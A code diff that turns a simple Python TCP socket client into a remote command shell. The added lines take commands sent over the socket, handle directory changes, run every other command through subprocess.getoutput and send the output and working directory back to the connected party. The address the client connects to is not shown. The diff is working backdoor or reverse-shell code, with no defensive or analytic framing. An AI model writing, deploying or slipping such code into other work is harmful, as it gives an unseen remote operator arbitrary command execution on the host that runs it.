@@ -1,5 +1,6 @@
 import socket
 import os
+import subprocess
 
 def main():
     # Create a TCP/IP socket
@@ -16,11 +17,42 @@ def main():
 
     while True:
         # Receive data
-        data = sock.recv(1024)
-        print(f'received {data.decode()}')
+        cmd = sock.recv(1024).decode()
+        if cmd == "exit":
+            break
 
+        sliced_cmd = cmd.split()
+        
+        
+
+        if sliced_cmd[0] == "cd":
+            try:
+                
+                os.chdir(''.join(sliced_cmd[1]))
+                
+            except FileNotFoundError as e:
+                output = str(e)
+            else:
+                output = ""
+        
+        else:
+            # Other commands
+            output = subprocess.getoutput(cmd)
+            
+
+                        
+        cwd = os.getcwd()
+        send = f"{output}|{cwd}"
+        sock.send(send.encode())
+
+    
+        
+        print(f'received {cmd}')
+    sock.close()
+
+        
         # Clean up the connection
-        sock.close()
+        #sock.close()
 
 
 if __name__ == "__main__":
